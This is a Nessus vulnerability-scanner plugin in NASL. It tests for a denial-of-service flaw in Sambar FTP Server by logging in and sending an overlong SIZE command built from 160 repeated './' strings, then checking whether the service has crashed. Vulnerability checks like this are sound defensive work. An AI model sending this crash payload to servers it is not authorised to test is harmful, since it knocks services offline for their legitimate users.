#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(24020);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2006-6624");
  script_bugtraq_id(21617);
  script_osvdb_id(32336);
  script_xref(name:"EDB-ID", value:"2934");
 
  script_name(english:"Sambar FTP Server Malformed SIZE Command DoS");
  script_summary(english:"Tries to crash Sambar Server with long FTP size command");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using Sambar Server, a multi-service
application for Windows and Linux. 

The version of Sambar installed on the remote host crashes when its
FTP server component attempts to process a specially crafted SIZE
command. An authenticated, remote attacker can exploit this flaw to
deny service to legitimate users.");
 script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/01/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/12/15");
 script_cvs_date("$Date: 2016/06/10 21:03:58 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
 
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


port = get_ftp_port(default: 21);


# Make sure the banner indicates it's Sambar.
banner = get_ftp_banner(port:port);
if (!banner || "Sambar FTP Server" >!< banner) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item_or_exit("ftp/login");
pass = get_kb_item("ftp/password");


soc = open_sock_tcp(port);
if (!soc) exit(1);
if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  ftp_close(socket:soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Try to exploit the flaw to crash the daemon.
c = "SIZE ";
for (i=1; i<=160; i++) c += './';
send(socket:soc, data: c + '\r\n');
s = ftp_recv_line(socket:soc);
ftp_close(socket:soc);
if (!isnull(s)) exit(0);


# The server doesn't crash right away so try for a bit to open a connection.
failed = 0;
tries = 5;
for (iter=0; iter<=tries; iter++)
{
  soc = open_sock_tcp(port);
  if (soc)
  {
    failed = 0;
    close(soc);
    sleep(1);
  }
  else
  {
    failed++;
    if (failed > 1)
    {
      security_warning(port);
      exit(0);
    }
  }
}

